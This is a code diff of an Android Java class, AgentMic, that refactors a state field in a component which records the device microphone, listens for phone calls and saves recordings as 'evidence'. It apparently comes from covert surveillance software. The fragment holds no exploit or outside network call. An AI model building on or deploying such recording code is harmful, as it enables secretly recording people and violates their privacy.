@@ -69,7 +69,7 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 
 	/** The recorder. */
 	MediaRecorder recorder;
-	StateRun state;
+	
 	Object stateLock = new Object();
 
 	private int numFailures;
@@ -89,7 +89,7 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 	public void begin() {
 		try {
 			synchronized (stateLock) {
-				if (state != StateRun.STARTED) {
+				if (status == StateRun.STARTING) {
 					addPhoneListener();
 					recorder = new MediaRecorder();
 
@@ -99,7 +99,7 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 					startRecorder();
 					Log.d("QZ", TAG + "started");
 				}
-				state = StateRun.STARTED;
+				status = StateRun.STARTED;
 			}
 		} catch (IllegalStateException e) {
 			// TODO Auto-generated catch block
@@ -119,17 +119,17 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 	@Override
 	public void end() {
 		synchronized (stateLock) {
-			if (state == StateRun.STARTED) {
+			if (status == StateRun.STARTED) {
 				removePhoneListener();
 
-				Check.ensures(state != StateRun.STOPPED, "state == STOPPED");
+				Check.ensures(status != StateRun.STOPPED, "state == STOPPED");
 
 				saveRecorderEvidence();
 				stopRecorder();
 				recorder.release();
 				recorder = null;
 			}
-			state = StateRun.STOPPED;
+			status = StateRun.STOPPED;
 
 		}
 		Log.d("QZ", TAG + "stopped");
@@ -144,7 +144,7 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 	@Override
 	public void go() {
 		synchronized (stateLock) {
-			if (state == StateRun.STARTED) {
+			if (status == StateRun.STARTED) {
 				int amp = recorder.getMaxAmplitude();
 				int audio = recorder.getAudioSourceMax();
 
